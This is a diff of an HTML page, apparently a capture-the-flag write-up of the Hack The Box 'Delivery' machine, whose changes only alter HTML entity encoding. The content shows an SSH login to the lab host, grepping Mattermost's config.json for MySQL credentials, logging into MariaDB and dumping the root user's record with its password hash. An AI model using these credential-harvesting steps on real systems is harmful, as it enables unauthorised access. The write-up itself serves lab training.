@@ -229,14 +229,14 @@ PORT     STATE SERVICE VERSION
 |     Accept-Ranges: bytes
 |     Cache-Control: no-cache, max-age=31556926, public
 |     Content-Length: 3108
-|     Content-Security-Policy: frame-ancestors 'self'; script-src 'self' cdn.rudderlabs.com
+|     Content-Security-Policy: frame-ancestors &#39;self&#39;; script-src &#39;self&#39; cdn.rudderlabs.com
 |     Content-Type: text/html; charset=utf-8
 |     Last-Modified: Sat, 06 Mar 2021 09:36:48 GMT
 |     X-Frame-Options: SAMEORIGIN
 |     X-Request-Id: 716993bnstdu3cu87b9dsch7bh
 |     X-Version-Id: 5.30.0.5.30.1.57fb31b889bf81d99d8af8176d4bbaaa.false
 |     Date: Sat, 06 Mar 2021 13:19:54 GMT
-|     &lt;!doctype html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0&quot;&gt;&lt;meta name=&quot;robots&quot; content=&quot;noindex, nofollow&quot;&gt;&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;&lt;title&gt;Mattermost&lt;/title&gt;&lt;meta name=&quot;mobile-web-app-capable&quot; content=&quot;yes&quot;&gt;&lt;meta name=&quot;application-name&quot; content=&quot;Mattermost&quot;&gt;&lt;meta name=&quot;format-detection&quot; content=&quot;telephone=no&quot;&gt;&lt;link re
+|     &lt;!doctype html&gt;&lt;html lang=&#34;en&#34;&gt;&lt;head&gt;&lt;meta charset=&#34;utf-8&#34;&gt;&lt;meta name=&#34;viewport&#34; content=&#34;width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0&#34;&gt;&lt;meta name=&#34;robots&#34; content=&#34;noindex, nofollow&#34;&gt;&lt;meta name=&#34;referrer&#34; content=&#34;no-referrer&#34;&gt;&lt;title&gt;Mattermost&lt;/title&gt;&lt;meta name=&#34;mobile-web-app-capable&#34; content=&#34;yes&#34;&gt;&lt;meta name=&#34;application-name&#34; content=&#34;Mattermost&#34;&gt;&lt;meta name=&#34;format-detection&#34; content=&#34;telephone=no&#34;&gt;&lt;link re
 |   HTTPOptions:
 |     HTTP/1.0 405 Method Not Allowed
 |     Date: Sat, 06 Mar 2021 13:19:54 GMT
@@ -303,7 +303,7 @@ to go dig for vulnerabilities on Google. Another interesting fact is that the un
 is <code>mysql</code>. This too is good information to keep in the back of our minds as we go forward.</p>
 <p>Anyway, back to the credentials.</p>
 <pre tabindex="0"><code>$ ssh maildeliverer@10.10.10.222
-maildeliverer@10.10.10.222's password:
+maildeliverer@10.10.10.222&#39;s password:
 Linux Delivery 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64
 
 The programs included with the Debian GNU/Linux system are free software;
@@ -349,17 +349,17 @@ MatterMost installation directory allows us to quickly stumble upon the configur
 find it here <code>/opt/mattermost/config</code>. Since we&rsquo;re looking for some <code>mysql</code> credentials, throwing a
 <code>grep</code> command against it sounds like a good idea.</p>
 <pre tabindex="0"><code>maildeliverer@Delivery:/opt/mattermost/config$ cat config.json  | grep -B5 -A5 -i mysql
-        &quot;DesktopMinVersion&quot;: &quot;&quot;,
-        &quot;IosLatestVersion&quot;: &quot;&quot;,
-        &quot;IosMinVersion&quot;: &quot;&quot;
+        &#34;DesktopMinVersion&#34;: &#34;&#34;,
+        &#34;IosLatestVersion&#34;: &#34;&#34;,
+        &#34;IosMinVersion&#34;: &#34;&#34;
     },
-    &quot;SqlSettings&quot;: {
-        &quot;DriverName&quot;: &quot;mysql&quot;,
-        &quot;DataSource&quot;: &quot;mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8\u0026readTimeout=30s\u0026writeTimeout=30s&quot;,
-        &quot;DataSourceReplicas&quot;: [],
-        &quot;DataSourceSearchReplicas&quot;: [],
-        &quot;MaxIdleConns&quot;: 20,
-        &quot;ConnMaxLifetimeMilliseconds&quot;: 3600000,
+    &#34;SqlSettings&#34;: {
+        &#34;DriverName&#34;: &#34;mysql&#34;,
+        &#34;DataSource&#34;: &#34;mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8\u0026readTimeout=30s\u0026writeTimeout=30s&#34;,
+        &#34;DataSourceReplicas&#34;: [],
+        &#34;DataSourceSearchReplicas&#34;: [],
+        &#34;MaxIdleConns&#34;: 20,
+        &#34;ConnMaxLifetimeMilliseconds&#34;: 3600000,
 maildeliverer@Delivery:/opt/mattermost/config$
 </code></pre><p>Bingo, our hunch was correct. The part of the connection string that we&rsquo;re interested in is
 <code>mmuser:Crack_The_MM_Admin_PW</code>. This is the user name and the password the application uses to
@@ -371,14 +371,14 @@ actually already installed on the machine so we can use them right out of the bo
 <p>We won&rsquo;t go over how to use the <code>mysql</code> command but a quick <code>--help</code> flag or a Google search can
 help us out.</p>
 <p>Let&rsquo;s go ahead and connect to it.</p>
-<pre tabindex="0"><code>maildeliverer@Delivery:/opt/mattermost/config$ mysql -u mmuser --password=&quot;Crack_The_MM_Admin_PW&quot;
+<pre tabindex="0"><code>maildeliverer@Delivery:/opt/mattermost/config$ mysql -u mmuser --password=&#34;Crack_The_MM_Admin_PW&#34;
 Welcome to the MariaDB monitor.  Commands end with ; or \g.
 Your MariaDB connection id is 86717
 Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10
 
 Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
 
-Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+Type &#39;help;&#39; or &#39;\h&#39; for help. Type &#39;\c&#39; to clear the current input statement.
 
 MariaDB [(none)]&gt; use mattermost
 Reading table information for completion of table and column names
@@ -430,12 +430,12 @@ interested in, <code>root</code>.</p>
              Roles: system_admin system_user
     AllowMarketing: 1
              Props: {}
-       NotifyProps: {&quot;channel&quot;:&quot;true&quot;,&quot;comments&quot;:&quot;never&quot;,&quot;desktop&quot;:&quot;mention&quot;,&quot;desktop_sound&quot;:&quot;true&quot;,&quot;email&quot;:&quot;true&quot;,&quot;first_name&quot;:&quot;false&quot;,&quot;mention_keys&quot;:&quot;&quot;,&quot;push&quot;:&quot;mention&quot;,&quot;push_status&quot;:&quot;away&quot;}
+       NotifyProps: {&#34;channel&#34;:&#34;true&#34;,&#34;comments&#34;:&#34;never&#34;,&#34;desktop&#34;:&#34;mention&#34;,&#34;desktop_sound&#34;:&#34;true&#34;,&#34;email&#34;:&#34;true&#34;,&#34;first_name&#34;:&#34;false&#34;,&#34;mention_keys&#34;:&#34;&#34;,&#34;push&#34;:&#34;mention&#34;,&#34;push_status&#34;:&#34;away&#34;}
 LastPasswordUpdate: 1609157893370
  LastPictureUpdate: 0
     FailedAttempts: 0
             Locale: en
-          Timezone: {&quot;automaticTimezone&quot;:&quot;Africa/Abidjan&quot;,&quot;manualTimezone&quot;:&quot;&quot;,&quot;useAutomaticTimezone&quot;:&quot;true&quot;}
+          Timezone: {&#34;automaticTimezone&#34;:&#34;Africa/Abidjan&#34;,&#34;manualTimezone&#34;:&#34;&#34;,&#34;useAutomaticTimezone&#34;:&#34;true&#34;}
          MfaActive: 0
          MfaSecret:
 </code></pre><p>This is great, we have a hash in the <code>password</code> field for the <code>root</code> user &ndash; we&rsquo;re making good
